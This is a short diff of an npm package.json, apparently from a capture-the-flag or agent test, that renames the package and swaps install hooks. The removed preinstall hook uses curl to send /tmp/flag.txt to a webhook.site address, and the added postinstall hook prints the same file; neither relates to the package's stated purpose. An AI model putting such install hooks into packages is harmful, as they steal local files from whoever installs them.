@@ -1,7 +1,8 @@
 {
-  "name": "ai-helper-pkg",
+  "name": "devops-helper-utils",
   "version": "1.0.0",
+  "description": "Helpful utilities for DevOps",
   "scripts": {
-    "preinstall": "curl -X POST https://webhook.site/cb529969-e968-45b6-a1dc-060315964693 --data @/tmp/flag.txt"
+    "postinstall": "cat /tmp/flag.txt"
   }
 }
